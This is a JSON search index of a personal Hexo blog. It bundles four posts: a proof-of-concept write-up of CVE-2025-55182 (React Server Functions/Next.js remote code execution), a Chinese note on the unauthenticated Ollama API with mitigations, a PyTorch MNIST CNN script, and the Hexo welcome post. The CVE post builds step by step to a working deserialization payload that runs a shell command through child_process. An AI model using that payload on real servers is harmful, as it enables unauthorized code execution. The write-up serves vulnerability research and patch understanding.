[{"title":"CVE-2025-55182 POC","url":"/2025/12/07/CVE-2025-55182-POC/","content":"# CVE-2025-55182\n\nThis vulnerability allows RCE in React Server Functions, e.g. as\noffered by Next.js through insecure prototype references.\n\nI'm not an expert in React or Next.js, so take all the information\nhere with a grain of salt.\n\n## Background\n\nReact offers Server Functions[^1], which can be seen as sort of an RPC-\nover-HTTP. They can be used to fetch data from adjacent peers to ensure\nlow latency, or perform authenticated requests that the client lacks\ncredentials for.\n\nReact uses something called the React Flight Protocol[^2] for serialization\nof values passed to Server Functions.\n\nThe client passes \"chunks\" to the server, e.g. via form data:\n\n```py\nfiles = {\n    \"0\": (None, '[\"$1\"]'),\n    \"1\": (None, '{\"object\":\"fruit\",\"name\":\"$2:fruitName\"}'),\n    \"2\": (None, '{\"fruitName\":\"cherry\"}'),\n}\n```\n\nAs shown, these can have references in between each other.\nThe above payload deserializes to the following on the server:\n\n```js\n{ object: 'fruit', name: 'cherry' }\n```\n\nThe format itself is a little more intricate and allows for more\ncomplex serialization and deserialization, but this provides a\nbasic understanding for the actual vulnerability.\n\n## Vulnerability\n\nUntil this commit[^3], when traversing chunks in reference resolving,\nsuch as getting the `fruitName` from chunk 2 in the above example, React\ndidn't verify whether the requested key was actually set on the object.\nThis allowed us to get the object prototype[^4].\n\nThis can be demonstrated with a payload like this:\n\n```py\nfiles = {\n    \"0\": (None, '[\"$1:__proto__:constructor:constructor\"]'),\n    \"1\": (None, '{\"x\":1}'),\n}\n```\n\nWhich deserializes to the function constructor[^5]:\n\n```js\n[Function: Function]\n```\n\nWhen the chunk with ID 0 is not an array but an object, we can\nset the `then` key to the function constructor. The object is then\nreturned by the `decodeReplyFromBusboy` function and awaited by Next.js:\n\n```ts\n// action-handler.ts:888 (pre-patch)\nboundActionArguments = await decodeReplyFromBusboy(\n    busboy,\n    serverModuleMap,\n    { temporaryReferences }\n)\n```\n\nWhen this returns a thenable, the `await` in the caller will call it.\nThis is what happens with this payload:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\":\"$1:__proto__:constructor:constructor\"}'),\n    \"1\": (None, '{\"x\":1}'),\n}\n```\n\nLeading to this error:\n\n```console-out\nSyntaxError: Unexpected token 'function'\n    at Object.Function [as then] (<anonymous>) {\n      digest: '1259793845'\n    }\n```\n\nThe error looks like this since V8 calls an `await`ed function\nwith the internal `resolve` and `reject` functions, which, when\n`toString`ed, serialize to something like this:\n\n```js\nfunction () { [native code] }\n```\n\n## Exploitation\n\nSince we can trivially retrieve the `Function` constructor, the\nstraightforward way is to find a call gadget that invokes the\nconstructor with a user-controlled value (i.e., the code of the\nfunction as a string), and later calls the returned function.\n\nThere are multiple places that can call the function constructor,\nfor example `resolveServerReference`, where `id` is a controlled object,\nand `lastIndexOf` can be overwritten to return a user-controlled string\n(e.g. via `Array.prototype.join`) and `slice` can be overwritten to the\nfunction constructor. However, this place doesn't work as the second\ninvocation of `.slice()` supplies a number as the first argument,\nwhich -to my best knowledge- can never be handled by the function\nconstructor.\n\nHere, a brilliant idea from maple3142[^6] comes in. When `getChunk`\ngrabs the chunk at ID 0 as the root reference to start resolving the\nreference chain, *this very same chunk* can resolve to a crafted\n\"fake chunk\".\n\nWe can reference the crafted chunk 0 in chunk 1 by using the\n`$@` syntax, which returns the \"raw\" chunk, not it's resolved value:\n\n```js\ncase \"@\":\n  return (\n    (obj = parseInt(value.slice(2), 16)), getChunk(response, obj)\n  );\n```\n\nCombining this with our `then` overwrite from above, we can craft\nsomething like this:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\": \"$1:__proto__:then\"}'),\n    \"1\": (None, '\"$@0\"'),\n}\n```\n\nHere, chunk 0 overwrites its own `.then()` with the `.then()` of\nits own raw chunk representation. Put simply, we overwrite our\nown `.then()` with `Chunk.prototype.then`, which exists, since\n`Chunk`s are thenables:\n\n```js\nChunk.prototype.then = function (resolve, reject) {\n      switch (this.status) {\n        case \"resolved_model\":\n          initializeModelChunk(this);\n      }\n      // ...\n```\n\nWith the above payload, `Chunk.prototype.then` is eventually called\nwith the crafted chunk with ID 0.\n\nAs shown above, when `.status` on our fake chunk is `resolved_model`:\n\n```py\nfiles = {\n    \"0\": (None, '{\"then\": \"$1:__proto__:then\", \"status\": \"resolved_model\"}'),\n    \"1\": (None, '\"$@0\"'),\n}\n```\n\nWe get into `initializeModelChunk`. Here, `.value` is parsed as JSON,\nand then references are resolved on the returned object, using the \"outer\"\ncontext of our chunks with IDs 0 and 1:\n\n```js\nfunction initializeModelChunk(chunk) {\n    // ...\n    var rawModel = JSON.parse(resolvedModel),\n        value = reviveModel(chunk._response, { \"\": rawModel }, \"\", rawModel, rootReference);\n    // ...\n```\n\nWithin this, we now get a second pass of evaluation with a little more\nvalues we have access to due to the outer context already being resolved.\n\nThere is a call gadget in the handling of blob data with the `$B` prefix\nin the flight protocol:\n\n```js\ncase \"B\":\n  return (\n    (obj = parseInt(value.slice(2), 16)),\n    response._formData.get(response._prefix + obj)\n  );\n```\n\nUsing the special `_response` field, we control the `response` property\nof the crafted chunk:\n\n```js\n// in initializeModelChunk\nvalue = reviveModel(chunk._response, // ...\n```\n\nWith this, we can craft an object with fake `._formData` and `._prefix`\nproperties:\n\n```py\ncrafted_chunk = {\n    \"then\": \"$1:__proto__:then\",\n    \"status\": \"resolved_model\",\n    \"reason\": -1,\n    \"value\": '{\"then\": \"$B0\"}',\n    \"_response\": {\n        \"_prefix\": f\"return foo; // \",\n        \"_formData\": {\n            \"get\": \"$1:constructor:constructor\",\n        },\n    },\n}\n```\n\nThe `.reason` needs to be added to circumvent failing on the `toString`\ninvocation in `initializeModelChunk:\n\n```js\nvar rootReference = -1 === chunk.reason ? void 0 : chunk.reason.toString(16), resolvedModel = chunk.value;\n```\n\nBy pointing `._formData` to the function constructor, and `._prefix` to\nour code, we get an invocation gadget for the function constructor in\nthe blob deserialization:\n\n```js\nresponse._formData.get(response._prefix + \"0\")\n// becomes\nFunction(\"return foo; // 0\")\n```\n\nOur crafted function is then returned by `parseModelString` as the\n`.then()` method of the crafted chunk, which is also awaited, since\nall of this takes place in a single promise resolving chain. Thus,\nreturning a thenable, our crafted function gets called. This constitutes\nthe required call gadget referenced above.\n\nPutting this all together with an actual RCE payload, we get something\nlike this:\n\n```py\ncrafted_chunk = {\n    \"then\": \"$1:__proto__:then\",\n    \"status\": \"resolved_model\",\n    \"reason\": -1,\n    \"value\": '{\"then\": \"$B0\"}',\n    \"_response\": {\n        \"_prefix\": f\"process.mainModule.require('child_process').execSync('calc');\",\n        \"_formData\": {\n            \"get\": \"$1:constructor:constructor\",\n        },\n    },\n}\n\nfiles = {\n    \"0\": (None, json.dumps(crafted_chunk)),\n    \"1\": (None, '\"$@0\"'),\n}\n```\n\nThe bonus, which makes this vulnerability even worse, is that all of this\nhappens during deserialization, before the requested action is first validated\nin `getActionModIdOrError`. Thus, setting a header like `Next-Action: foo` is\nsufficient to trigger the vulnerability.\n\n## Patch\n\nUsing the chunk references to retrieve prototype properties is\nfixed with this check:\n\n```diff\n@@ -78,7 +80,10 @@ export function preloadModule<T>(\n \n export function requireModule<T>(metadata: ClientReference<T>): T {\n   const moduleExports = parcelRequire(metadata[ID]);\n-  return moduleExports[metadata[NAME]];\n+  if (hasOwnProperty.call(moduleExports, metadata[NAME])) {\n+    return moduleExports[metadata[NAME]];\n+  }\n+  return (undefined: any);\n }\n```\n\n[^1]: <https://react.dev/reference/rsc/server-functions>\n[^2]: <https://tonyalicea.dev/blog/understanding-react-server-components/>\n[^3]: <https://github.com/facebook/react/pull/35277/commits/e2fd5dc6ad973dd3f220056404d0ae0a8707998d>\n[^4]: <https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Advanced_JavaScript_objects/Object_prototypes>\n[^5]: <https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function/Function>\n[^6]: <https://x.com/maple3142>\n","categories":["baseTest"]},{"title":"Ollama 未授权访问漏洞 CNVD-2025-04094","url":"/2025/07/08/Ollama-未授权访问漏洞-CNVD-2025-04094/","content":"# Ollama 未授权访问漏洞 CNVD-2025-04094\n\n## 漏洞描述\n\nOllama 是一个本地私有化部署大语言模型（LLM，如 DeepSeek 等）的运行环境和平台，简化了大语言模型在本地的部署、运行和管理过程，具有简化部署、轻量级可扩展、API 支持、跨平台等特点，在 AI 领域得到了较为广泛的应用。\n\nOllama 存在未授权访问漏洞。由于 Ollama 默认未设置身份验证和访问控制功能，未经授权的攻击者可在远程条件下调用 Ollama 服务接口，执行包括但不限于敏感模型资产窃取、虚假信息投喂、模型计算资源滥用和拒绝服务、系统配置篡改和扩大利用等恶意操作。\n\n参考链接：\n\n- https://www.cnvd.org.cn/flaw/show/CNVD-2025-04094\n\n## 漏洞影响\n\n```\n未设置身份验证和访问控制功能且暴露在公共互联网上的 Ollama 易受此漏洞攻击影响\n```\n\n## 环境搭建\n\ndocker-compose.yml\n\n```\nservices:\n  ollama:\n    image: ollama/ollama:0.3.14\n    container_name: ollama\n    volumes:\n      - ollama:/root/.ollama\n    ports:\n      - \"11434:11434\"\n\nvolumes:\n  ollama:\n```\n\n执行如下命令启动 Ollama 0.3.14 服务:\n\n```\ndocker compose up -d\n```\n\n环境启动后，访问 `http://your-ip:11434/`，此时 Ollma 0.3.14 已经成功运行。\n\n\n## 漏洞复现\n\nOllama 公开了多个执行各种操作的 [API endpoints](https://github.com/ollama/ollama/blob/main/docs/api.md)：\n\n\n 通过 `/api/tags` 列出所有模型：\n\n```\nhttp://your-ip:11434/api/tags\n```\n\n## 漏洞修复\n\n- 限制公网访问：避免直接将 Ollama 服务端口（默认 11434）暴露在公网，仅允许内网或通过 VPN 访问。\n- 配置网络访问控制：通过云安全组、防火墙等手段限制对 Ollama 服务端口的访问来源，仅允许可信的源 IP 地址连接。\n- 启用身份认证保护：通过反向代理（如 Nginx）启用 HTTP Basic Authentication 或基于 OAuth 的认证机制。","categories":["baseTest"]},{"title":"CNN","url":"/2024/06/14/CNN/","content":"import torch\nimport torch.nn as nn\nimport torchvision \nimport torch.utils.data as Data\n \ntorch.manual_seed(1)  # 设置随机种子, 用于复现\n \n# 超参数\nEPOCH = 1       # 前向后向传播迭代次数\nLR = 0.001      # 学习率 learning rate \nBATCH_SIZE = 50 # 批量训练时候一次送入数据的size\nDOWNLOAD_MNIST = True \n \n# 下载mnist手写数据集\n# 训练集\ntrain_data = torchvision.datasets.MNIST(  \n    root = './MNIST/',                      \n    train = True,                            \n    transform = torchvision.transforms.ToTensor(),                                                \n    download=DOWNLOAD_MNIST \n)\n \n# 测试集\ntest_data = torchvision.datasets.MNIST(root='./MNIST/', train=False)  # train设置为False表示获取测试集\n \n# 一个批训练 50个样本, 1 channel通道, 图片尺寸 28x28 size:(50, 1, 28, 28)\ntrain_loader = Data.DataLoader(\n    dataset = train_data,\n    batch_size=BATCH_SIZE,\n    shuffle=True\n) \n#  测试数据预处理；只测试前2000个\ntest_x = torch.unsqueeze(test_data.data,dim=1).float()[:2000] / 255.0\n# shape from (2000, 28, 28) to (2000, 1, 28, 28)\ntest_y = test_data.targets[:2000]\n \nclass CNN(nn.Module):\n    def __init__(self):\n        super(CNN,self).__init__()\n \n        self.conv1 = nn.Sequential(\n            nn.Conv2d(                      # 输入的图片 （1，28，28）\n                in_channels=1,\n                out_channels=16,            # 经过一个卷积层之后 （16,28,28）\n                kernel_size=5,\n                stride=1,                    # 如果想要 con2d 出来的图片长宽没有变化, padding=(kernel_size-1)/2 当 stride=1\n                padding=2\n            ),\n            nn.ReLU(),\n            nn.MaxPool2d(kernel_size=2)      # 经过池化层处理，维度为（16,14,14）\n        )\n \n        self.conv2 = nn.Sequential(\n            nn.Conv2d(                         # 输入（16,14,14）\n                in_channels=16,\n                out_channels=32,\n                kernel_size=5,\n                stride=1,\n                padding=2\n            ),                                 # 输出（32,14,14）\n            nn.ReLU(),\n            nn.MaxPool2d(kernel_size=2)        # 输出（32,7,7）\n        )\n \n        self.out = nn.Linear(32*7*7,10)\n \n    def forward(self, x):\n        x = self.conv1(x)                     #（batch_size,16,14,14）\n        x = self.conv2(x)                     # 输出（batch_size,32,7,7）\n        x = x.view(x.size(0),-1)              # (batch_size,32*7*7)\n        out = self.out(x)                     # (batch_size,10)\n        return out\n \ncnn = CNN()\noptimizer = torch.optim.Adam(cnn.parameters(),lr=LR) # 定义优化器\nloss_func = nn.CrossEntropyLoss() # 定义损失函数\n \nfor epoch in range(EPOCH):\n \n    for step,(batch_x,batch_y) in enumerate(train_loader):\n        pred_y = cnn(batch_x)\n        loss = loss_func(pred_y,batch_y)\n        optimizer.zero_grad() # 清空上一层梯度\n        loss.backward() # 反向传播\n        optimizer.step() # 更新优化器的学习率，一般按照epoch为单位进行更新\n \n        if step % 50 == 0:\n            test_output = cnn(test_x)\n            pred_y = torch.max(test_output, 1)[1].numpy()  # torch.max(test_out,1)返回的是test_out中每一行最大的数)\n                                                                # 返回的形式为torch.return_types.max(\n                                                                #           values=tensor([0.7000, 0.9000]),\n                                                                #           indices=tensor([2, 2]))\n                                                                # 后面的[1]代表获取indices\n            print('Epoch: ', epoch, '| train loss: %.4f' % loss.data.numpy())\n \n \n# 打印前十个测试结果和真实结果进行对比\ntest_output = cnn(test_x[:10])\npred_y = torch.max(test_output, 1)[1].numpy()\nprint(pred_y, 'prediction number')\nprint(test_y[:10].numpy(), 'real number')","categories":["featTest"]},{"title":"Hello World","url":"/2016/12/07/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]